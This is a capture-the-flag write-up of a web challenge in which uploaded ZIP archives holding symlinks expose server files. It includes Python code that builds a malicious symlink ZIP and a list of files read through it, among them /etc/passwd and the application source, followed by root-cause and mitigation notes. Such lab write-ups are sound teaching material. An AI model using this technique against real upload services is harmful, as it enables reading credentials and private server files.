# File Viewer — Web CTF Writeup

**CTF:** HI Cyber Con 2026  
**Challenge:** File Viewer (Zip Checker)  
**Category:** Web Exploitation  
**Vulnerability:** Arbitrary File Read via ZIP Symlink  
**Flag:** `hiCTF{E45Y_5yml1Nk_0636e6760a}`

## 1. Challenge Description

> Upload a file and explore the results.

**Challenge URL:**
https://file-viewer-77f6e74246b1.chall.hiddeninvestigations.net

The challenge provides a simple web application called **Zip Checker**. Users can upload ZIP archives, view their contents, and access extracted files through generated URLs.

Our objective was to discover a vulnerability that would allow us to retrieve the flag stored on the server.

## 2. Reconnaissance

Visiting the website revealed a file-upload form.

The application accepts ZIP archives and processes them using the following endpoint:

```http
POST /analyze
Content-Type: multipart/form-data
```

The uploaded file is provided through the `file` field.

After uploading a normal ZIP archive containing `hello.txt`, the application returned a page listing the extracted file.

The generated file URL followed this structure:

```text
/<random_token>/hello.txt
```

For example:

```text
/fa17fe78b6e30989aadf38cabfc6673f/hello.txt
```

Opening this URL returned the original file contents.

This demonstrated that uploaded archive members were being made accessible through a file-serving endpoint.

## 3. Identifying the Vulnerability

The next step was to determine whether the application safely handled potentially malicious ZIP entries.

We investigated several attack vectors:

- ZIP path traversal (Zip Slip)
- Command injection through filenames
- Template injection
- Symbolic links pointing outside the extraction directory

The command-injection tests did not reveal execution, and direct traversal requests returned HTTP 404.

However, testing symbolic links produced interesting results.

A ZIP file can contain symbolic-link entries rather than ordinary files. A symbolic link references another path on the filesystem.

If the server extracts such an entry and follows the symbolic link while serving it, an attacker may be able to read files outside the intended extraction directory.

## 4. Exploitation

We created a malicious ZIP archive containing symbolic links to several possible flag locations.

The most important entry was:

```text
links/probe_03.txt -> /app/flag.txt
```

The ZIP symlink can be constructed using Python's `zipfile` module:

```python
import zipfile
import stat

with zipfile.ZipFile("exploit.zip", "w") as z:
    info = zipfile.ZipInfo("links/flag.txt")

    info.create_system = 3

    info.external_attr = (
        stat.S_IFLNK | 0o777
    ) << 16

    z.writestr(info, "/app/flag.txt")
```

Here:

- `create_system = 3` identifies the entry as using Unix filesystem metadata.
- `stat.S_IFLNK` marks the archive entry as a symbolic link.
- `/app/flag.txt` is the target path encoded as the symlink contents.

We uploaded this archive through the application's `/analyze` endpoint.

The application successfully processed the ZIP and generated URLs for its entries.

We then requested the extracted symlink through the generated file-viewer URL.

For our successful test, the request was equivalent to:

```http
GET /<upload_token>/links/probe_03.txt
```

Instead of rejecting the symbolic link or restricting access to the extraction directory, the server followed it and returned the contents of `/app/flag.txt`.

The response was:

```text
HTTP 200 OK
Content-Type: text/plain; charset=utf-8

hiCTF{E45Y_5yml1Nk_0636e6760a}
```

**The flag was successfully recovered.**

## 5. Additional Verification

We confirmed that the vulnerability was not limited to the flag.

Other symbolic links successfully accessed sensitive server files:

| Symlink target | Result |
|---|---|
| `/app/flag.txt` | HTTP 200 — Flag recovered |
| `/etc/passwd` | HTTP 200 — File contents exposed |
| `/etc/hostname` | HTTP 200 — Hostname exposed |
| `/proc/self/cwd/app.py` | HTTP 200 — Application source exposed |
| `/flag.txt` | HTTP 404 |
| `/app/flag` | HTTP 404 |

These findings confirmed an arbitrary file-read vulnerability through symlink handling.

The application did not adequately enforce that served files remained inside the permitted extraction directory.

## 6. Root Cause

The vulnerability resulted from **improper validation of symbolic links in uploaded archives**.

Although files were placed under a unique upload directory, symbolic links could reference absolute paths elsewhere on the server.

When the application served an uploaded entry, it followed the symbolic link to its target without sufficiently restricting access.

The randomly generated upload directory therefore did not prevent access to files outside that directory.

### Security Impact

An attacker capable of uploading an archive could potentially read sensitive files accessible to the web application process, including source code, configuration files, and application secrets.

### Mitigation

To prevent this vulnerability, the application should reject symbolic links in untrusted archives or enforce strict filesystem containment after resolving paths.

It should also validate archive entries before extraction and ensure that its file-serving endpoint cannot follow links outside the designated upload directory.

## 7. Flag

```text
hiCTF{E45Y_5yml1Nk_0636e6760a}
```

## Conclusion

The File Viewer challenge demonstrated how unsafe symbolic-link handling in uploaded archives can lead to arbitrary file disclosure.

While ordinary path traversal and command-injection probes did not succeed, a ZIP containing a symbolic link to `/app/flag.txt` allowed us to read the flag directly.

**Key takeaway:** Extracting user-controlled archives into isolated directories is not sufficient if the application subsequently follows attacker-controlled symbolic links outside those directories.
